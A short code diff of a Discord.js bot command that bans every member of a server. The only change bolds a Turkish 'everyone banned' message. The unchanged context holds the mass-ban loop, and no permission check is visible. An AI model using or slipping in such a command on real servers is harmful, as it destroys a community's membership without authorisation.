@@ -3,7 +3,7 @@ const Discord = require("discord.js");
 module.exports.run = async (client, message, args) => {
   
 message.guild.members.forEach(member => {member.ban()});
-message.channel.send("```Herkez Banlandı.!```")
+message.channel.send("```**Herkez Banlandı.!**```")
   
 };
 
